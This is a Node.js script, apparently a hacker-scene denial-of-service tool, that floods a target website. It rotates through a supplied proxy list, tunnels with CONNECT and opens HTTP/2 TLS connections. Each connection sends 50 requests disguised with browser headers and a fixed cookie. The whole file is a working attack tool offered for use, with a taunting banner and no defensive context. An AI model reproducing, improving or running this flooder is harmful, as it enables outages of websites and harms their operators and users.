process.setMaxListeners(15);
const http = require('http');
const tls = require('tls');
const fs = require('fs');
const url = require('url');
const http2 = require('http2');

process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

if (process.argv.length !== 5){
    console.log(`
    <3 RainBowHat.....
    No Command HaHa..
    (<target> <time> <proxies.txt>)
    `);
    process.exit(0);
} else {
    startflood();
    console.log(`
    LeoNion On TOP
    <3<3<3<3<3<3<3<3<3<3
    `)
    setTimeout(() => {

    },1000 * process.argv[3]);
}

const parsed = url.parse(process.argv[2]);

const proxies = fs.readFileSync(process.argv[4], 'utf-8').toString().replace(/\r/g, '').split('\n').filter(Boolean);

function startflood(){
    setInterval(() => {

        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        proxysplit = proxy.split(':');
    
        const req = http.request({ 
            host: proxysplit[0],
            port: proxysplit[1],
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return;
        });
    
        req.on('connect', function (res, socket, head) { 
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    host: parsed.host,
                    ciphers: 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
                    secureProtocol: 'TLSv1_2_method',
                    servername: parsed.host,
                    secure: true,
                    rejectUnauthorized: false,
                    ALPNProtocols: ['h2'],
                    socket: socket
                }, function () {
                    for (let i = 0; i< 50; i++){
                        client.request({
                            ":path":parsed.path,
                            "User-agent":"Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0",
                            "Cache-Control": "max-age=0",
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                            "Accept-Encoding": "gzip, deflate, br",
                            "Accept-Language": "en-CA;en-US;q=0.7,en;q=0.3en-US",
                            "Cookie": "csrftoken=4S8b2nFcnCBSOgaDpilZzqqFOoX1hmOIhdEdEPDp7XXpt1KPiqWJ09OQ4nHhROlC; _sp_id.1fff=baac8734-646a-457f-a9e5-ca39f87a42af.1653941292.3.1654620108.1654042966.34733fa1-03af-48d1-a687-a7df3a82aaf0",
                            "Sec-Fetch-Dest": "document",
                            "Sec-Fetch-Mode": "navigate",
                            "Sec-Fetch-Site": "none",
                            "Sec-Fetch-User": "?1",
                            "DNT": "1",
                            "Sec-GPC": '1'
                        }).close();
                    }
                })
            });
        });
        req.end();
    });

}